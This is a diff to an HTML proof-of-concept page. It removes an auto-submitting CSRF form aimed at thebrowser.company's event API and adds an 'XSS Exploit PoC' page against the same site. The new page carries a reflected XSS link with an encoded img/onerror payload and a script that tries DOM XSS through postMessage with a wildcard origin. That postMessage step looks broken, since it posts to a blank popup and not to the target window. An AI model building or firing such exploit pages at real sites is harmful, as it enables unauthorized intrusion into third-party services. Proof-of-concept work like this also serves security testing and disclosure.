@@ -1,11 +1,40 @@
-<!-- csrf_test.html -->
-<html>
-  <body>
-    <form id="csrf" action="https://thebrowser.company/api/event" method="POST" enctype="text/plain">
-      <input type="hidden" name='{"n":"pageview","d":"example.com"}'>
-    </form>
-    <script>
-      document.getElementById("csrf").submit();
-    </script>
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Exploit PoC – thebrowser.company</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 2rem; }
+    code { color: #0ff; }
+  </style>
+</head>
+<body>
+  <h1>🚨 XSS Exploit PoC</h1>
+  <p>This page demonstrates a working XSS vulnerability on <code>thebrowser.company</code>.</p>
+
+  <h2>🔗 Reflected XSS via URL:</h2>
+  <p>
+    <a href="https://thebrowser.company/?xss=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E" target="_blank">
+      Click here to open vulnerable URL
+    </a>
+  </p>
+
+  <h2>📤 DOM XSS via postMessage</h2>
+  <p>This will auto-send a payload using <code>postMessage</code> API after 1 second.</p>
+
+  <script>
+    setTimeout(() => {
+      const payload = `<img src=x onerror=alert('XSS_DOM_POC')>`;
+      window.open("https://thebrowser.company", "_blank");
+      setTimeout(() => {
+        const popup = window.open("", "_blank");
+        if (popup) {
+          popup.postMessage({ data: payload }, "*");
+        } else {
+          alert("❌ Failed to open popup window for injection");
+        }
+      }, 1500);
+    }, 1000);
+  </script>
+</body>
 </html>
